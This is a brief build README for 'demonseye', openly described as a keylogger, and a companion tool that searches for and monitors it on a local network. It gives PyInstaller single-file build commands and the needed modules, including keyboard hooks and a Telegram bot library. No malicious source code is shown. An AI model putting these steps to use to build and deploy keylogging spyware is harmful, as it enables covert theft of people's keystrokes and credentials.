# Executable creation with PyInstaller

To create the executable in Windows, PyInstaller has been used.

Executable compression is disabled and the creation of a single file is forced.

You can build simply with *build.bat* file included

### Pynstaller installation

    pip install pyinstaller

### Keylogger: demonseye

This is the keylogger.

    pyinstaller -F --noupx --clean demonseye.py

### Keylogger searcher and monitor: demonseye-net-search

This is the keylogger searcher in local network and monitor.

    pyinstaller -F --noupx --clean demonseye-net-search.py

### Required modules

+ pypiwin32
+ pywin32>=224
+ pyWinhook>=1.6.1
+ win32gui
+ requests>=2.18.4
+ python-telegram-bot


    Installation example:
        pip install modulename
       
       